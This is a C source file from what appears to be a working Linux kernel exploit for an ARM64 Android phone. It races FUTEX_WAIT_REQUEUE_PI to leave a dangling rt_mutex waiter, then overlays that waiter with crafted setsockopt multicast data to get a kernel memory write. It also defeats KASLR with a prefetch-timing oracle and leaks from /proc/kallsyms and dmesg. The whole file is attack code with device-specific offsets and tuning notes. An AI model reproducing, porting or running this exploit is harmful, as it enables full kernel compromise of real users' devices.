#include "common.h"

#include <sys/socket.h>
#include <netinet/in.h>

#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_WAIT_SECONDS 30

/* ---------------- setsockopt-MCAST stamp overlay (z3q stack geometry) ----
 * The waiter (do_futex inlined rt_waiter) sits at SP0-0x190. The
 * IPPROTO_IP MCAST_JOIN_SOURCE_GROUP path copies a 264-byte
 * struct group_source_req to do_ip_setsockopt's frame at sp+0x20 with the
 * chain depth SP0-0x250 (sys_setsockopt 0x50 + springboard 0x10 +
 * sock_common_setsockopt 0x10 + springboard 0x10 + udp_setsockopt 0x10 +
 * ip_setsockopt 0x30 + do_ip_setsockopt 0x190), so the gsr lands at
 * SP0-0x230 and the waiter's fields are gsr+0x40..0x98 — ALL inside the
 * fully-controlled copy (the family/port validation happens AFTER the
 * copy and its EINVAL return is irrelevant to the stamp).
 *
 * The pselect overlay cannot work on this build: its fd_set buffers span
 * [SP0-0x210, SP0-0x138) but only the first 15 qwords are user-controlled,
 * ending 8 bytes ABOVE the waiter's tree_entry. */
#define STAMP_GSR_WAITER_OFF 0x40
#define STAMP_BUF_SZ 264
#define STAMP_ROUNDS 200000

static int slide_stamp_fd = -1;
static char slide_stamp_buf[STAMP_BUF_SZ];

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static char slide_stock_bootid[64];
static int slide_stock_bootid_len;
static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */


/* ---------------- per-boot KASLR slide oracle (EL0 prefetch TLB timing) ----
 * No KPTI on this SoC, so kernel mappings live in every user process's TTBR1
 * tables. A burst of PRFM on one VA times ~5 when the page is TLB-resident
 * vs 14-22 when every PRFM walks and fails. Cold-mapped pages are invisible
 * (Cortex-A77 does not fill the TLB for permission-failing EL0 prefetches),
 * but the image's first 2MB holds the exception vectors (+0x2000), which
 * are hot on every timer interrupt. The image base is 2MB-aligned and lives
 * inside the vmalloc region, so sweeping that region at 2MB steps finds
 * exactly one candidate cluster; its first slot is the image base.
 * Zero crash risk: PRFM is a non-faulting hint. (tools/prefetch_probe.c is
 * the standalone twin of this code.) */
static uint64_t slide_prefetch_time(uint64_t va)
{
    uint64_t best = ~0ULL;
    for (int r = 0; r < 4; r++) {
        uint64_t t0, t1;
        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t0));
        for (int i = 0; i < 64; i++)
            asm volatile("prfm pldl1keep, [%0]" :: "r"(va) : "memory");
        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t1));
        if (t1 - t0 < best)
            best = t1 - t0;
    }
    return best;
}

static uint64_t slide_oracle_find_slide(void)
{
    /* The image link base (0xffffff8008080000) is NOT 2MB-aligned — it sits
     * 0x80000 into its 2MB block — and the slide is 2MB-aligned, so the
     * runtime image base keeps that misalignment. The probe grid is
     * link + SYS_CALL_TABLE_PAGE + s*2MB: sys_call_table is rodata read on
     * every syscall, so its page is DTLB-hot on any active system. (A data
     * prefetch is required: the exception-vectors page is instruction-only
     * and stays cold in the DTLB on this split-TLB core.) Each probe tests
     * exactly one slide hypothesis. */
    const uint64_t link = KIMAGE_TEXT_BASE;
    const uint64_t sct_page = 0x1980000ULL;  /* sys_call_table link page */
    const uint64_t jif_page = 0x2b87000ULL;  /* jiffies link page, read every tick */
    const uint64_t span = 0xffffffc000000000ULL - 0xffffff8000000000ULL;
    int nslots = (int)(span >> 21);
    uint64_t found = ~0ULL;
    int hits = 0;
    for (uint64_t s = 0; s < (uint64_t)nslots; s++) {
        uint64_t t = slide_prefetch_time(link + sct_page + s * 0x200000ULL);
        if (t < 10) {
            /* candidate: module-region pages also light up, so require the
             * jiffies page of the SAME hypothesis to be hot too */
            uint64_t tj = slide_prefetch_time(link + jif_page + s * 0x200000ULL);
            if (tj < 10) {
                if (found == ~0ULL)
                    found = s * 0x200000ULL;
                hits++;
            }
        }
    }
    /* second pass to drop transient false positives */
    if (found != ~0ULL) {
        uint64_t t = slide_prefetch_time(link + sct_page + found);
        if (t >= 10) {
            pr_warning("slide oracle: candidate lost on re-probe, no slide\n");
            return ~0ULL;
        }
    }
    if (found == ~0ULL) {
        pr_warning("slide oracle: no hot slot found\n");
        return ~0ULL;
    }
    pr_success("slide oracle: slide=%016llx hot=%d recheck=%llu\n",
               (unsigned long long)found, hits,
               (unsigned long long)slide_prefetch_time(link + sct_page + found));
    return found;
}

static void slide_capture_stock_bootid(void) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    slide_stock_bootid_len = -1;
    return;
  }
  ssize_t n = read(fd, slide_stock_bootid, sizeof(slide_stock_bootid) - 1);
  close(fd);
  if (n <= 0) {
    slide_stock_bootid_len = -1;
    return;
  }
  slide_stock_bootid[n] = 0;
  while (n > 0 && slide_stock_bootid[n - 1] == '\n') {
    slide_stock_bootid[--n] = 0;
  }
  slide_stock_bootid_len = (int)n;
  pr_info("slide stock boot_id captured len=%d\n", n);
}

static void slide_stamp_prepare(void) {
  memset(slide_stamp_buf, 0, sizeof(slide_stamp_buf));

  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
  uint64_t mirror = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;

  /* waiter field F lives at gsr + (STAMP_GSR_WAITER_OFF + F) */
  uint64_t *q = (uint64_t *)(slide_stamp_buf + STAMP_GSR_WAITER_OFF);
  q[0] = loggers;             /* tree_entry.rb_parent_color = P (W1 value) */
  q[1] = 0;                   /* tree_entry.rb_right = NULL (simple path) */
  q[2] = bootid_data;         /* tree_entry.rb_left = C (W1 target) */
  q[3] = loggers;             /* pi_tree_entry.rb_parent_color */
  q[4] = 0;                   /* pi_tree_entry.rb_right */
  q[5] = bootid_data;         /* pi_tree_entry.rb_left */
  q[6] = init_task;           /* waiter->task (real struct, walkable) */
  q[7] = mirror;              /* waiter->lock (all-zero rt_mutex, walkable) */
  q[8] = FAKE_WAITER_PRIO;    /* waiter->prio */
  q[9] = 0;                   /* waiter->deadline */

  pr_info("slide stamp: loggers=%016llx bootid_data=%016llx task=%016llx "
          "lock=%016llx\n",
          (unsigned long long)loggers, (unsigned long long)bootid_data,
          (unsigned long long)init_task, (unsigned long long)mirror);

  slide_stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (slide_stamp_fd < 0) {
    pr_error("slide stamp socket failed errno=%d\n", errno);
  }
}

static void slide_stamp_once(void) {
  if (slide_stamp_fd < 0) {
    return;
  }
  setsockopt(slide_stamp_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
             slide_stamp_buf, STAMP_BUF_SZ);
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}



void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
  uint64_t mirror_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;

  /* z3q stack geometry, disasm-derived (see PORTING.md §7):
   *   waiter (do_futex rt_waiter @SP0-0x190) - pselect fd buf (@SP0-0x210)
   *   = DELTA 0x80, so waiter field F = fdset word (0x80+F)/8.
   *   tree_entry.parent_color = word 10, .rb_right = 11, .rb_left = 12;
   *   pi_tree_entry.parent_color = 13, .rb_right = 14; pi .rb_left = 15
   *   (res_out region: kernel-zeroed, pi erase takes the no-child path).
   *   task/lock sit past the plantable window in res_ex — do not plant.
   * The old k40 table put wake_state(3) on word 13 = pi_tree
   * parent_color: the pi erase then read [0x13] and panicked the boot
   * (runs 1-8, the final unknown failure). */
  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {10, loggers, "tree_pc"},
    {11, 0, "tree_right"},
    {12, bootid_data, "tree_left"},
    {13, loggers, "pi_pc"},
    {14, 0, "pi_right"},
  };
  (void)init_task;
  (void)mirror_lock;
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* upstream GhostLock poc timing: 50ms futex timeout, the requeue lands
   * ~20ms in — the timeout cleanup races the requeue finalization and
   * leaves the rt_waiter dangling on this thread's stack. */
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += 50000000;
  if (timeout.tv_nsec >= 1000000000) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000;
  }

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  /* Do NOT unlock f_pi_chain here: the pi chain (owner blocked on it) is
   * what makes the requeue race leave this thread's rt_waiter dangling,
   * and the exit-time teardown of that chain is what later erases the
   * stamped waiter. */

  /* Overlay the dangling rt_mutex_waiter on this thread's kernel stack
   * with the MCAST gsr stamp: the setsockopt copy lands at the exact
   * frame offsets computed from the vmlinux (see the geometry comment
   * above). Then kill the whole child: the exit teardown walks the pi
   * chain and erases the stamped waiter, landing the gadget write. */
  slide_stamp_prepare();
  atomic_store(&slide_consume_go, 1);
  for (int i = 0; i < STAMP_ROUNDS; i++) {
    slide_stamp_once();
  }
  atomic_store(&slide_route_done, 1);
  /* Park syscall-free so the stamped kernel stack frame survives until
   * the requeue-race cleanup erases it during the stamp window (the
   * k40-exploit design: the waiter stays parked inside/near the overlay
   * and the erase fires from the requeue path, NOT from process-exit
   * teardown — do_exit's deep frames overwrite the stamped region, which
   * is the _exit flow the upstream *poc* uses for its crash demo only). */
  for (;;) {
    pause();
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  uint64_t leaked_hi = 0;
  for (int i = 8; i < 16; i++) {
    leaked_hi |= (uint64_t)raw[i] << ((i - 8) * 8);
  }
  pr_success("slide boot_id readback pid=%d q0=%016llx q1=%016llx\n",
             getpid(), (unsigned long long)leaked,
             (unsigned long long)leaked_hi);
  /* The UUID dashes are print format, not content, so compare against the
   * stock UUID captured before the gadget ran: a CHANGED readback proves
   * the W1 write landed and we are reading kernel memory. */
  if (slide_stock_bootid_len > 0 &&
      strncmp(buf, slide_stock_bootid, (size_t)slide_stock_bootid_len) == 0) {
    pr_warning("slide boot_id unchanged — write did not land\n");
    return 0;
  }
  if ((leaked >> 48) == 0xffff) {
    uint64_t stext = leaked - SLIDE_NFULNL_LOGGER_OFF;
    pr_success("slide boot_id-derived_stext pid=%d value=%016llx stext=%016llx\n",
               getpid(), (unsigned long long)leaked,
               (unsigned long long)stext);
    return stext;
  }
  if (leaked == 0 && leaked_hi == 0) {
    pr_warning("slide write LANDED (readback all-zero); loggers[0][0] empty "
               "at this slide\n");
    return KIMAGE_TEXT_BASE + slide_slide;
  }
  pr_warning("slide readback is kernel memory but not a slid pointer "
             "(slide nonzero?): q0=%016llx q1=%016llx\n",
             (unsigned long long)leaked, (unsigned long long)leaked_hi);
  return 0;
}
/* Runs the requeue race in the CHILD process; the waiter thread stamps
 * the dangling rt_waiter and _exit(0)s the whole process, so the
 * exit-time pi-chain teardown erases the stamped waiter. The boot_id
 * readback happens in the parent afterwards. */
void slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  usleep(20000);
  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  /* Park until the waiter's stamp loop _exit()s the process (fallback
   * timeout so a failed race does not hang the attempt forever). */
  sleep(15);
}

/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
 * are not restricted - common on OPPO/ColorOS debug builds) */
static int slide_leak_from_kallsyms(void) {
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  uint64_t text = 0;
  while (fgets(line, sizeof(line), f)) {
    unsigned long long addr = 0;
    char type = 0;
    char name[128] = {0};
    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
        strcmp(name, "_text") == 0) {
      text = (uint64_t)addr;
      break;
    }
  }
  fclose(f);
  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
    kaslr_base = text;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
  return 0;
}

/* round-3: dmesg "Kernel Offset" fallback */
static int slide_leak_from_dmesg(void) {
  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  int got = 0;
  unsigned long long off = 0;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
      got = 1;
      break;
    }
  }
  pclose(f);
  if (!got) {
    pr_warning("slide: dmesg Kernel Offset unavailable\n");
    return 0;
  }
  kaslr_base = KIMAGE_TEXT_BASE + off;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
             getpid(), off, (unsigned long long)kaslr_base);
  return 1;
}

int slide_leak_kernel_base(void) {
  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
    return 1;
  }
  slide_slide = slide_oracle_find_slide();
  if (slide_slide != ~0ULL) {
    kaslr_base = KIMAGE_TEXT_BASE + slide_slide;
    kaslr_slide = slide_slide;
    pr_success("slide oracle set kaslr_base=%016llx slide=%016llx\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
  }
#ifdef CFGOPS_4_19_STYLE
  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
             (unsigned long long)(SLIDE_LOGGERS_0_1_IMAGE + slide_slide),
             (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide));
#endif
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
#ifdef SLIDE_MIRROR_MODE
    /* z3q: the walk only dereferences fake_lock as an all-zero empty
     * rt_mutex, so the .bss tail hole (slid along with the image) stands
     * in for the KernelSnitch-leaked payload page (see target.h). */
    page_base = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
    fake_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
    fake_w0 = fake_lock + 0x100; /* guard-only value in slide mode */
    pr_info("slide mirror mode lock=%016zx\n", fake_lock);
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    /* The gadget write lands during the CHILD's stamp window (the
     * requeue-race cleanup erases the stamped rt_waiter). The boot_id
     * readback happens HERE, in the parent, after the child is reaped. */
    slide_capture_stock_bootid();

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      disable_rseq_for_thread();
      log_slide_child_context();
      slide_child_leak_stext();
      _exit(1);
    }

    int status = 0;
    SYSCHK(waitpid(child, &status, 0));

    uint64_t stext = slide_read_stext();
    if (!stext) {
      pr_warning("slide attempt %d failed (child status=%d, boot_id "
                 "unchanged)\n", attempt, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
